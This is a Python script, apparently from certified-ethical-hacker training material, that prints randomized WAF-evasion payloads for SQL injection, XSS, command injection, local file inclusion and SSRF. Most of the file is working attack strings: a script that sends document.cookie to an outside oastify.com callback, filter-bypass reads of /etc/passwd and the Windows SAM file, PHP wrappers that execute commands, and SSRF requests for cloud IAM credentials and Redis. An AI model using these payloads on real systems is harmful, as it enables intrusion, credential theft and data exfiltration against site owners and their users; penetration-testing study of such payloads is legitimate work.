#!/usr/bin/env python3
# LAB-ONLY: Polymorphic WAF-Evasion Payload Generator
# CEH v13 Ultimate Offensive Script 12
# STRICTLY FOR AUTHORIZED LAB USE ONLY!
#
# PURPOSE: Generates context-aware, encoded, and obfuscated payloads
# designed to bypass WAFs, input filters, and signature-based detection.
# Each payload is unique (polymorphic) to defeat pattern matching.
import sys
import random
import string
import base64
import urllib.parse
import html
import json
from datetime import datetime

# ═══════════════════════════════════════════════════════════════════════════════
# POLYMORPHIC PAYLOAD ENGINE
# ═══════════════════════════════════════════════════════════════════════════════

class PayloadGenerator:
    def __init__(self):
        self.generated = []

    @staticmethod
    def _rand_str(length=6):
        return "".join(random.choices(string.ascii_lowercase, k=length))

    @staticmethod
    def _rand_int():
        return random.randint(1000, 9999)

    # ─── SQL Injection Payloads ──────────────────────────────────────────────
    def sqli_payloads(self, columns=3):
        marker = self._rand_str()
        num = self._rand_int()
        payloads = [
            # Boolean-based blind
            (f"' AND {num}={num} -- ", "Boolean TRUE — response should match normal"),
            (f"' AND {num}={num+1} -- ", "Boolean FALSE — response should differ"),
            # Time-based blind
            (f"' AND (SELECT SLEEP({random.randint(3,7)})) -- ", "MySQL time-based blind"),
            (f"'; WAITFOR DELAY '0:0:{random.randint(3,7)}' -- ", "MSSQL time-based blind"),
            (f"' AND pg_sleep({random.randint(3,7)}) -- ", "PostgreSQL time-based blind"),
            # UNION-based with dynamic column count
            (f"' UNION SELECT {','.join([f'0x{self._rand_str(8)}' for _ in range(columns)])} -- ", f"UNION {columns}-column hex marker extraction"),
            # Stacked queries
            (f"'; SELECT LOAD_FILE('/etc/passwd') INTO OUTFILE '/tmp/{marker}.txt' -- ", "Stacked query file read (MySQL)"),
            # WAF bypass: inline comments
            (f"' /*!50000UNION*/ /*!50000SELECT*/ {','.join([str(i) for i in range(1,columns+1)])} -- ", "MySQL version-conditioned comment bypass"),
            # WAF bypass: case alternation
            (f"' uNiOn SeLeCt {','.join([str(i) for i in range(1,columns+1)])} -- ", "Case alternation bypass"),
            # WAF bypass: double URL encoding
            (f"' %252f%252a*/UNION%252f%252a*/SELECT {','.join([str(i) for i in range(1,columns+1)])} -- ", "Double URL-encoded comment bypass"),
            # Error-based
            (f"' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e)) -- ", "MySQL error-based EXTRACTVALUE"),
            (f"' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) -- ", "MySQL error-based double query"),
        ]
        return payloads

    # ─── XSS Payloads ───────────────────────────────────────────────────────
    def xss_payloads(self):
        marker = self._rand_str()
        callback = f"https://lab-{self._rand_str(4)}.oastify.com"
        payloads = [
            # Standard reflected
            (f"<script>alert('{marker}')</script>", "Basic script tag"),
            # Event handlers (no script tag — bypasses many filters)
            (f"<img src=x onerror=alert('{marker}')>", "IMG onerror event"),
            (f"<svg/onload=alert('{marker}')>", "SVG onload (no spaces)"),
            (f"<body onpageshow=alert('{marker}')>", "Body onpageshow"),
            (f"<details open ontoggle=alert('{marker}')>", "HTML5 details ontoggle"),
            (f"<marquee onstart=alert('{marker}')>", "Marquee onstart"),
            # Filter bypass: encoding
            (f"<img src=x onerror=&#97;&#108;&#101;&#114;&#116;('{marker}')>", "HTML entity encoded alert()"),
            (f"<script>eval(atob('{base64.b64encode(f\"alert('{marker}')\".encode()).decode()}'))</script>", "Base64 encoded eval"),
            # Filter bypass: template literals
            (f"<script>alert`{marker}`</script>", "Template literal (no parentheses)"),
            # DOM-based
            (f"javascript:alert(document.domain)//", "JavaScript URI scheme"),
            # Polyglot (works in multiple contexts)
            (f"jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert('{marker}') )//", "Polyglot XSS payload"),
            # Cookie theft (OOB)
            (f"<script>fetch('{callback}?c='+document.cookie)</script>", f"OOB cookie exfil to {callback}"),
            # CSP bypass via JSONP
            (f"<script src='https://accounts.google.com/o/oauth2/revoke?callback=alert({self._rand_int()})'></script>", "CSP bypass via Google JSONP"),
            # Mutation XSS (mXSS)
            (f"<noscript><p title=\"</noscript><img src=x onerror=alert('{marker}')\">", "Mutation XSS via noscript"),
        ]
        return payloads

    # ─── Command Injection ───────────────────────────────────────────────────
    def cmdi_payloads(self):
        marker = self._rand_str()
        num_a, num_b = self._rand_int(), self._rand_int()
        expected = num_a + num_b
        payloads = [
            # Verification payloads (math-based confirmation)
            (f"; expr {num_a} + {num_b}", f"Linux arithmetic — look for '{expected}' in response"),
            (f"| echo $(({num_a}+{num_b}))", f"Bash arithmetic — look for '{expected}'"),
            (f"& set /a {num_a}+{num_b}", f"Windows set /a — look for '{expected}'"),
            # Blind (time-based)
            (f"; sleep {random.randint(5,10)}", "Linux blind time-based"),
            (f"& ping -n {random.randint(5,10)} 127.0.0.1", "Windows blind time-based (ping)"),
            # Filter bypass: $IFS (internal field separator replaces spaces)
            (f";cat$IFS/etc/passwd", "IFS space bypass"),
            # Filter bypass: newlines
            (f"%0aid", "URL-encoded newline injection"),
            (f"%0awhoami", "URL-encoded newline + whoami"),
            # Filter bypass: variable concatenation
            (f";a=ca;b=t;$a$b /etc/passwd", "Variable concatenation bypass"),
            # Wildcard bypass
            (f";/???/??t /???/p??s??", "Wildcard globbing bypass (/bin/cat /etc/passwd)"),
            # Backtick injection
            (f"`echo {marker}`", f"Backtick injection — look for '{marker}'"),
            # PowerShell
            (f"| powershell -c \"[System.Net.Dns]::GetHostByName('{marker}.lab.test')\"", "PowerShell DNS callback"),
        ]
        return payloads

    # ─── LFI / Path Traversal ────────────────────────────────────────────────
    def lfi_payloads(self):
        payloads = [
            # Standard traversal depths
            ("../../../etc/passwd", "3-level traversal"),
            ("....//....//....//etc/passwd", "Double-dot filter bypass"),
            ("..%252f..%252f..%252fetc/passwd", "Double URL-encoded traversal"),
            ("%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd", "UTF-8 overlong encoding"),
            # PHP wrappers
            ("php://filter/convert.base64-encode/resource=index.php", "PHP base64 filter — reads source code"),
            ("php://input", "PHP input wrapper — POST body becomes code (with POST data)"),
            ("expect://id", "PHP expect wrapper — direct command execution"),
            ("data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==", "PHP data wrapper — injects <?php system('id'); ?>"),
            # Log poisoning (User-Agent → LFI)
            ("/var/log/apache2/access.log", "Apache access log — combine with User-Agent PHP injection"),
            ("/proc/self/environ", "Process environment variables — may contain secrets"),
            ("/proc/self/fd/0", "Standard input file descriptor"),
            # Windows targets
            ("..\\..\\..\\Windows\\win.ini", "Windows backslash traversal"),
            ("..\\..\\..\\Windows\\System32\\config\\SAM", "SAM database (password hashes)"),
        ]
        return payloads

    # ─── SSRF Payloads ───────────────────────────────────────────────────────
    def ssrf_payloads(self):
        payloads = [
            # Cloud metadata endpoints
            ("http://169.254.169.254/latest/meta-data/iam/security-credentials/", "AWS metadata — IAM role credentials"),
            ("http://169.254.169.254/computeMetadata/v1/", "GCP metadata (add Metadata-Flavor: Google header)"),
            ("http://169.254.169.254/metadata/instance?api-version=2021-02-01", "Azure metadata"),
            # Internal service discovery
            ("http://127.0.0.1:6379/", "Redis (internal)"),
            ("http://127.0.0.1:9200/_cat/indices", "Elasticsearch (internal)"),
            ("http://127.0.0.1:8500/v1/agent/self", "Consul API (internal)"),
            # DNS rebinding
            (f"http://A.{self._rand_str(8)}.1time.7f000001.nip.io/", "DNS rebinding to 127.0.0.1"),
            # Protocol smuggling
            ("gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a", "Gopher → Redis command injection"),
            ("dict://127.0.0.1:6379/CONFIG SET dir /var/www/html", "DICT → Redis config write"),
            # IP bypass techniques
            ("http://0x7f000001/", "Hex IP for 127.0.0.1"),
            ("http://0177.0.0.1/", "Octal IP for 127.0.0.1"),
            ("http://2130706433/", "Decimal IP for 127.0.0.1"),
            ("http://[::1]/", "IPv6 loopback"),
        ]
        return payloads

    # ─── Output all payloads ─────────────────────────────────────────────────
    def generate_all(self):
        print("=" * 80)
        print("  ⚡ POLYMORPHIC WAF-EVASION PAYLOAD GENERATOR")
        print("  LAB-ONLY — CEH v13 Ultimate Offensive Script 12")
        print("=" * 80)
        print(f"  Generated at: {datetime.now().isoformat()}")
        print(f"  Session ID:   {self._rand_str(12)}")
        print("  ℹ️  Each generation produces unique markers for zero signature overlap")
        print("=" * 80)

        categories = {
            "SQL Injection": self.sqli_payloads(),
            "Cross-Site Scripting (XSS)": self.xss_payloads(),
            "Command Injection": self.cmdi_payloads(),
            "Local File Inclusion (LFI)": self.lfi_payloads(),
            "Server-Side Request Forgery (SSRF)": self.ssrf_payloads(),
        }

        total = 0
        for cat_name, payloads in categories.items():
            print(f"\n{'─' * 80}")
            print(f"  🎯 {cat_name} ({len(payloads)} payloads)")
            print(f"{'─' * 80}")
            for i, (payload, desc) in enumerate(payloads, 1):
                print(f"\n  [{i:02d}] {desc}")
                print(f"       {payload}")
                self.generated.append({"category": cat_name, "payload": payload, "description": desc})
                total += 1

        print(f"\n{'=' * 80}")
        print(f"  📊 TOTAL: {total} unique payloads generated across {len(categories)} categories")
        print(f"  ⚡ All markers are randomized — re-run for fresh payloads")
        print(f"{'=' * 80}")

        # Save to file
        outfile = f"payloads-{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        try:
            with open(outfile, "w") as f:
                json.dump(self.generated, f, indent=2)
            print(f"\n  📄 Payloads saved to: {outfile}")
        except Exception as e:
            print(f"\n  ⚠️  Could not save: {e}")


if __name__ == "__main__":
    gen = PayloadGenerator()
    gen.generate_all()
